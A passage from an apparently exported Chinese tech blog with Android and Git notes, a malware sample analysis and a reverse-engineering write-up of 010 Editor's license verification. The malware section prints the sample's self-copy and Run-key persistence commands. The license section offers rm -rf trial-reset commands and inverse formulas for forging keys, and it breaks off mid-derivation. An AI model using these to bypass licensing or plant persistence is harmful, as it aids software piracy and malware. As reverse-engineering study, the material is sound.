</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (level &lt;= DEBUG) &#123;</span><br><span class="line">            Log.d(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">i</span><span class="params">(String tag, String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (level &lt;= INFO) &#123;</span><br><span class="line">            Log.i(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">w</span><span class="params">(String tag, String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (level &lt;= WARN) &#123;</span><br><span class="line">            Log.w(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">e</span><span class="params">(String tag, String msg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (level &lt;= ERROR) &#123;</span><br><span class="line">            Log.e(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比如让level 等于VERBOSE 就可以把所有的日志都打印出来，让level 等于WARN 就可以只打印警告以上级别的日志，让level 等于NOTHING 就可以把所有日志都屏蔽掉。</p>
<h3 id="创建定时任务">创建定时任务<a class="header-anchor" href="#创建定时任务"> ¶ </a></h3>
<h4 id="Alarm机制">Alarm机制<a class="header-anchor" href="#Alarm机制"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongRunningService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 在这里执行具体的逻辑操作</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="comment">// 获得Alarm管理</span></span><br><span class="line">        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);</span><br><span class="line">        <span class="keyword">int</span> anHour = <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;  <span class="comment">// 这是一小时的毫秒数</span></span><br><span class="line">        <span class="comment">// 下次执行的时间</span></span><br><span class="line">        <span class="keyword">long</span> triggerAtTime = SystemClock.elapsedRealtime() + anHour;</span><br><span class="line">        Intent i = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, LongRunningService.class);</span><br><span class="line">        <span class="comment">// 启动的意图</span></span><br><span class="line">        PendingIntent pi = PendingIntent.getService(<span class="keyword">this</span>, <span class="number">0</span>, i, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 进行设置</span></span><br><span class="line">        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求时间准确，使用<code>setExact()</code>代替<code>set()</code></p>
<p>Doze模式：调用AlarmManager的setAndAllowWhileIdle() 或setExactAndAllowWhileIdle() 方法就能让定时任务即使在Doze模式下也能正常执行</p>
<h2 id="Android权限">Android权限<a class="header-anchor" href="#Android权限"> ¶ </a></h2>
<p><a href="https://developer.android.google.cn/reference/android/Manifest.permission">Manifest.permission  | Android Developers (google.cn)</a></p>
<h3 id="常见权限">常见权限<a class="header-anchor" href="#常见权限"> ¶ </a></h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span><span class="comment">&lt;!--    网络权限--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    API28+还需在application节点中添加-9属性 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span><span class="comment">&lt;!--    访问网络状态权限--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span><span class="comment">&lt;!--    监听开机权限--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span> /&gt;</span><span class="comment">&lt;!--    读外部存储权限--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><span class="comment">&lt;!--    写外部存储权限--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    从Android10开始,需要在application节点中添加android:requestLegacyExternalStorage=&quot;true&quot;属性--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="运行时权限-2">运行时权限<a class="header-anchor" href="#运行时权限-2"> ¶ </a></h3>
<p><a href="#runtime_permission">动态申请运行时权限代码示例</a></p>
<table>
<thead>
<tr>
<th style="text-align:center">权限组名</th>
<th style="text-align:center">权限名</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CALENDAR</td>
<td style="text-align:center">READ_CALENDAR<br>WRITE_CALENDAR</td>
</tr>
<tr>
<td style="text-align:center">CAMERA</td>
<td style="text-align:center">CAMERA</td>
</tr>
<tr>
<td style="text-align:center">CONTACTS</td>
<td style="text-align:center">READ_CONTACTS<br>WRITE_CONTACTS<br>GET_ACCOUNTS</td>
</tr>
<tr>
<td style="text-align:center">LOCATION</td>
<td style="text-align:center">ACCESS_FINE_LOCATION<br>ACCESS_COARSE_LOCATION</td>
</tr>
<tr>
<td style="text-align:center">MICROPHONE</td>
<td style="text-align:center">RECORD_AUDIO</td>
</tr>
<tr>
<td style="text-align:center">PHONE</td>
<td style="text-align:center">READ_PHONE_STATE<br>CALL_PHONE<br>READ_CALL_LOG<br>WRITE_CALL_LOG<br>ADD_VOICEMAIL<br>USE_SIP<br>PROCESS_OUTGOING_CALLS</td>
</tr>
<tr>
<td style="text-align:center">SENSORS</td>
<td style="text-align:center">BODY_SENSORS</td>
</tr>
<tr>
<td style="text-align:center">SMS</td>
<td style="text-align:center">SEND_SMS<br>RECEIVE_SMS<br>READ_SMS<br>RECEIVE_WAP_PUSH<br>RECEIVE_MMS</td>
</tr>
<tr>
<td style="text-align:center">STORAGE</td>
<td style="text-align:center">READ_EXTERNAL_STORAGE<br>WRITE_EXTERNAL_STORAGE</td>
</tr>
</tbody>
</table>
<h2 id="Git学习">Git学习<a class="header-anchor" href="#Git学习"> ¶ </a></h2>
<h3 id="Git高级用法">Git高级用法<a class="header-anchor" href="#Git高级用法"> ¶ </a></h3>
<h4 id="分支的用法">分支的用法<a class="header-anchor" href="#分支的用法"> ¶ </a></h4>
<ol>
<li>
<p>查看所有分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>创建分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch [name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>切换分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout [name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>合并branch_a分支到master分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并branch_a分支到当前分支</span></span><br><span class="line">git merge branch_a</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>删除分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -D [name]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="与远程协作">与远程协作<a class="header-anchor" href="#与远程协作"> ¶ </a></h4>
<ol>
<li>
<p>将远程代码下载到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> [url]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将本地更改提交到远程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>抓取远程到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch origin master</span><br></pre></td></tr></table></figure>
<p>同步下来的代码存放到<code>origin/master</code>分支上</p>
</li>
<li>
<p>查看远程版本库修改了什么（配合3）</p>
<p>查看后可以使用<code>git merge</code>合并分支到当前分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git diff origin/master</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>拉取最新代码并合并到本地（3,4的操作）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="零散知识块">零散知识块<a class="header-anchor" href="#零散知识块"> ¶ </a></h1>
<h2 id="Fragment">Fragment<a class="header-anchor" href="#Fragment"> ¶ </a></h2>
<h3 id="Fragment使用">Fragment使用<a class="header-anchor" href="#Fragment使用"> ¶ </a></h3>
<h4 id="Acitivity静态添加Fragment：">Acitivity静态添加Fragment：<a class="header-anchor" href="#Acitivity静态添加Fragment："> ¶ </a></h4>
<p>布局中添加<fragment>控件</fragment></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">fragment</span> <span class="attr">android:name</span>=<span class="string">&quot;&lt;Fragment全类名&gt;&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:layout_width</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:layout_height</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:id</span>=<span class="string">&quot;@+id/fragment_one&quot;</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用全类名直接指定相应fragment，activity就会自动嵌入该fragment</p>
<h4 id="Activity动态添加和管理Fragment：">Activity动态添加和管理Fragment：<a class="header-anchor" href="#Activity动态添加和管理Fragment："> ¶ </a></h4>
<ol>
<li>
<p>布局文件添加<code>&lt;FrameLayout&gt;</code>并设置ID属性</p>
</li>
<li>
<p>activity中动态替换Fragment代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">replaceFragment</span><span class="params">(Fragment fragment)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 得到Fragment管理实例</span></span><br><span class="line">    FragmentManager fragmentManager = getSupportFragmentManager();</span><br><span class="line">    <span class="comment">// 开启一个事务</span></span><br><span class="line">    FragmentTransaction transaction = fragmentManager.beginTransaction();</span><br><span class="line">    <span class="comment">// 进行替换Fragment，参数1为控件ID，参数二为fragment实例（new得到）</span></span><br><span class="line">    transaction.replace(R.id.framelayout, fragment);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据需要；将fragment添加到返回栈，这样back返回的时候将是之前添加的fragment，直到所有fragment都弹出</span></span><br><span class="line">    <span class="comment">// transaction.addToBackStack(null);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提交事务</span></span><br><span class="line">    transaction.commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Fragment和Activity进行通信">Fragment和Activity进行通信<a class="header-anchor" href="#Fragment和Activity进行通信"> ¶ </a></h3>
<h4 id="使用bundle通信">使用bundle通信<a class="header-anchor" href="#使用bundle通信"> ¶ </a></h4>
<p>Activity给Fragment传递消息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新建一个Bundle对象</span></span><br><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line"><span class="comment">// 放入相应数据键值对</span></span><br><span class="line">bundle.putString(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;I&#x27;m from Activity&quot;</span>);</span><br><span class="line"><span class="comment">// new一个fragment实例</span></span><br><span class="line">MyFragment myFragment = <span class="keyword">new</span> MyFragment();</span><br><span class="line"><span class="comment">// 将参数传递进去</span></span><br><span class="line">myFragment.setArguments(bundle);</span><br></pre></td></tr></table></figure>
<p>Fragment接收的时候</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="comment">// 获取传递的信息</span></span><br><span class="line">    Bundle bundle = <span class="keyword">this</span>.getArguments();</span><br><span class="line">    <span class="comment">// 根据键获取传递信息中的某个值</span></span><br><span class="line">    String msg = bundle.getString(<span class="string">&quot;message&quot;</span>);</span><br><span class="line">    Log.d(TAG,<span class="string">&quot;From Acitvity: &quot;</span>+msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用Java接口进行通信">使用Java接口进行通信<a class="header-anchor" href="#使用Java接口进行通信"> ¶ </a></h4>
<p>为Fragment通信新建一个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fragment通信接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IFragmentcallback</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送消息给Activity 方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sendMsgToActivity</span><span class="params">(String msg)</span></span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从Activity获取消息 方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">String <span class="title">getMsgFromActivity</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Acitvity代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">myFragment.setCallback(<span class="keyword">new</span> IFragmentcallback()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sendMsgToActivity</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;From Fragment: &quot;</span>+msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function">String <span class="title">getMsgFromActivity</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hi,I&#x27;m from Activity.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>Fragment代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> IFragmentcallback callback;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCallback</span><span class="params">(IFragmentcallback callback)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.callback = callback;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="其他方案">其他方案<a class="header-anchor" href="#其他方案"> ¶ </a></h4>
<p>eventBus，LiveData…</p>
<h3 id="Fragment生命周期">Fragment生命周期<a class="header-anchor" href="#Fragment生命周期"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//1688279-0424d62f50035b43.png" alt="Fragment生命周期"></p>
<p>1.打开界面</p>
<p>onCreate() -&gt; onCreateView() -&gt;onActivityCreated() -&gt;onStart() -&gt;onResume()</p>
<p>2.按下主屏键</p>
<p>onPause() -&gt;onStop()</p>
<p>3.重新打开界面.</p>
<p>onStart() -&gt;onResume()</p>
<p>4.按后退键</p>
<p>onPause()- &gt;onStop()- &gt;onDestroyView()-&gt;onDestroy()- &gt;onDetach()</p>
<p>在fragment栈中被覆盖：onPause()- &gt;onStop()- &gt;onDestroyView()</p>
<p>fragment栈 重新显示：onCreateView() -&gt;onActivityCreated() -&gt;onStart() -&gt;onResume()</p>
<h3 id="ViewPager2与Fragment">ViewPager2与Fragment<a class="header-anchor" href="#ViewPager2与Fragment"> ¶ </a></h3>
<p><a href="https://github.com/Forgo7ten/AndroidProjectPractice/tree/main/ViewPagerTest">AndroidProjectPractice/ViewPagerTest at main · Forgo7ten/AndroidProjectPractice (github.com)</a></p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>样本分析初战</title>
    <url>/Reverse/2020/Preliminary_analysis_of_virus_samples/</url>
    <content><![CDATA[<blockquote>
<p>CRC32: D13C9316<br>
MD5: C3F5ADD704F2C540F3DD345F853E2D84<br>
SHA-1: 09468DFBD4DA66CEF49BBFC06E36C6C2F94445CD<br>
PDB文件路径：C:\Users\Asterix\Documents\Visual Studio 2008\Projects\28NovDwn\Release\28NovDwn.pdb<br>
09/24/2018 06:32:31</p>
</blockquote>
<p>WinMain主函数主要是创建窗口<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//1.png" alt="image-20201115205703145"></p>
<p>分析一下sub_11812F0()函数（基址0x1180000）</p>
<p>创建文件夹&quot;C:\intel&quot;</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//2.png" alt="image-20201115210239037"></p>
<p>获取当前文件运行路径<code>C:\Users\Eliauk\Desktop\ba0cb1f47b69809ca0d3a5bd4163b8d1b77686a7e929b299d8c17e9eb183d128.exe</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//3.png" alt="image-20201115210427515"></p>
<p>分析一下sub_1183750()</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//4.png" alt="image-20201115211231307"></p>
<p>之后又重新创建了一下文件夹&quot;C:\intel&quot;</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//5.png" alt="image-20201115211404127"></p>
<p>执行完后此函数返回了一个注册表命令字符串：<code>reg add HKCU\Software\Microsoft\Windows\Currentversion\RUN /v ctfmers /d &quot;C:\intel\drvhost.exe&quot; /f</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//6.png" alt="image-20201115211530549"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//7.png" alt="image-20201203234440396"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//8.png" alt="image-20201203234229184"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//9.png" alt="image-20201203234519695"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//10.png" alt="image-20201203234637561"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//11.png" alt="image-20201115211845881"></p>
<p>分析 创建文件的线程函数</p>
<p>创建了一个进程，启动了<code> &quot;C:\Windows\system32\cmd.exe&quot;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//12.png" alt="image-20201114215151582"></p>
<p>以写文件的形式将命令通过管道传递给cmd.exe</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//13.png" alt="image-20201114220358125"></p>
<p>执行命令<code>copy &quot;C:\Users\Eliauk\Desktop\ba0cb1f47b69809ca0d3a5bd4163b8d1b77686a7e929b299d8c17e9eb183d128.exe&quot; &quot;C:\intel\drvhost.exe&quot;</code>也就是将本身复制到intel文件夹内</p>
<p>分析创建注册表项的线程11842D0</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//14.png" alt="image-20201115202828670"></p>
<p>在<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\Currentversion\Run</code>创建了一个名为<code>ctfserv</code>的键</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//15.png" alt="image-20201115202419415"></p>
<p>回到主线程，</p>
<p>该函数执行了释放的文件，然后退出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//16.png" alt="image-20201115212336639"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//17.png" alt="image-20201204002208572"></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>病毒分析</tag>
      </tags>
  </entry>
  <entry>
    <title>010Editor注册license算法分析</title>
    <url>/Reverse/2021/010Editor_registration_process_analysis/</url>
    <content><![CDATA[<h1 id="010Editor注册流程分析">010Editor注册流程分析<a class="header-anchor" href="#010Editor注册流程分析"> ¶ </a></h1>
<blockquote>
<p>无限试用：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -rf ~/.config/SweetScape/</span><br><span class="line">rm -rf ~/.<span class="built_in">local</span>/share/SweetScape/</span><br></pre></td></tr></table></figure>
</blockquote>
<p>Version: 12.0.1</p>
<h2 id="分析-5">分析<a class="header-anchor" href="#分析-5"> ¶ </a></h2>
<p>通过查找相应字符串<code>&quot;Invalid name or password&quot;</code>定位到关键函数</p>
<h3 id="Verify函数">Verify函数<a class="header-anchor" href="#Verify函数"> ¶ </a></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121173908017.png" alt="image-20211121173908017"></p>
<p>大概流程为</p>
<p>可以发现h157和h158行调用的函数至关重要。</p>
<p>下面的switch是判断其返回值，如果返回值<code>verify_b == 0xDB</code>时，注册成功</p>
<h4 id="verify-mothod-函数">verify_mothod_函数<a class="header-anchor" href="#verify-mothod-函数"> ¶ </a></h4>
<p>其中<code>verify_b = verify_mothod_(qword_7FF7DB0EEE50, 13i64, 18887i64);</code>如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121174330736.png" alt="image-20211121174330736"></p>
<p>发现还是通过调用<code>verify_mothod</code>函数的返回值来判断的</p>
<h4 id="verify-mothod函数">verify_mothod函数<a class="header-anchor" href="#verify-mothod函数"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121174742053.png" alt="image-20211121174742053"></p>
<p>执行流程：</p>
<ol>
<li>
<p>h48：判断用户名和密码均不为空，开始执行</p>
</li>
<li>
<p>通过h50: encode_password(a1, en_password);函数，将每两位密码合并成一个字节，得到一个长度为10的字节数组(TimeLicense Key) [或者长度为8的字节数组]</p>
</li>
<li>
<p>h51-h59：判断用户名不能等于999</p>
</li>
<li>
<p>h60-h94：</p>
<ol>
<li>用户名前两个字符如果为<code>&quot;Cow&quot;</code>，加密后的password不能为<code>[0xC4, 0x4A, 0x55, 0x59, 0x2A, 0x35, 0xE2, 0xC4, 0x65, 0xAC]</code></li>
<li>用户名前两个字符如果为<code>&quot;JUY&quot;</code>，加密后的password不能为某个数组（有些元素为空）</li>
<li>貌似没什么用</li>
</ol>
</li>
<li>
<p>h95-h100：简单的将编码后的密码数组赋值给变量</p>
</li>
<li>
<p>h101-h184：</p>
<ol>
<li>
<p>这里是对三种license类型的判断。</p>
<p>9c Evaluation Key</p>
<p>fc VersionLicense Key</p>
<p>ac TimeLicense Key</p>
</li>
<li>
<p>重点分析<code>0xac</code>，时间许可证</p>
<ol>
<li>
<p>首先根据en_password的<code>[1][2][5][7]</code>下标通过<code>get_count</code>函数解析出授权次数count</p>
<p>其中传入的参数低字节为<code>[5]^[2]</code>，高字节为<code>[7]^[1]</code></p>
<p>然后判断<code>count &lt;=1000</code>，处于<code>[1,1000]</code>才有效</p>
</li>
<li>
<p>然后通过<code>get_days</code>函数解析出过期天数days</p>
<p>传入的第一个参数也同理，三个字节从低到高分别为<code>0^6 4^8 5^9</code></p>
</li>
<li>
<p>之后跳转到<code>LABEL_26</code>，然后通过用户名计算出<code>4 5 6 7</code>下标的字节数组，然后比较，需要相同</p>
</li>
<li>
<p>h124-h146不进入。h147-h155，在这里如果days存在，并且数值大于<code>0x49c7</code>的话，转到成功返回值<code>0x2D</code></p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h5 id="encode-password函数">encode_password函数<a class="header-anchor" href="#encode-password函数"> ¶ </a></h5>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121194042153.png" alt="image-20211121194042153"></p>
<p>因为没有用循环来写，看着有些长，但实际上操作还是很简单的</p>
<p>执行流程：</p>
<ol>
<li>h50-h51：判断password的长度，若不等于19或者24，退出</li>
<li>h52-h62：判断password格式，<code>-</code>是不是在各自的位置（<code>4 9 14 19</code>）</li>
<li>h69-h152：除去<code>-</code>，每两个字符合并到一起，首先通过<code>cast_num</code>函数得到相应的数字，最终得到的数字为<code>16*[i]+[i+1]</code>；除去<code>-</code>还有20个字符，两两组合得到一个长度为10的char数组</li>
</ol>
<h6 id="cast-num函数">cast_num函数<a class="header-anchor" href="#cast-num函数"> ¶ </a></h6>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121194517887.png" alt="image-20211121194517887"></p>
<p>将数字0-9转换为<code>0-9</code>，字母不论大小写<code>a-z</code>对应着<code>10-35</code></p>
<h5 id="get-count">get_count<a class="header-anchor" href="#get-count"> ¶ </a></h5>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121194651881.png" alt="image-20211121194651881"></p>
<p>变换比较简单，即<code>count = (((((p5 ^ p2) + ((p7 ^ p1) &lt;&lt; 8)) ^ 0x7892) + 0x4D30) ^ 0x3421 )/0xB</code></p>
<p>其中要正好能被0xb整除，相应的逆过来就是</p>
<p><code>((p5 ^ p2) + ((p7 ^ p1) &lt;&lt; 8)) = count *0xb ^0x3421 - 0x4d30 ^ 0x7892</code></p>
<h5 id="get-days">get_days<a class="header-anchor" href="#get-days"> ¶ </a></h5>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121194706479.png" alt="image-20211121194706479"></p>
<p>逆运算为</p>
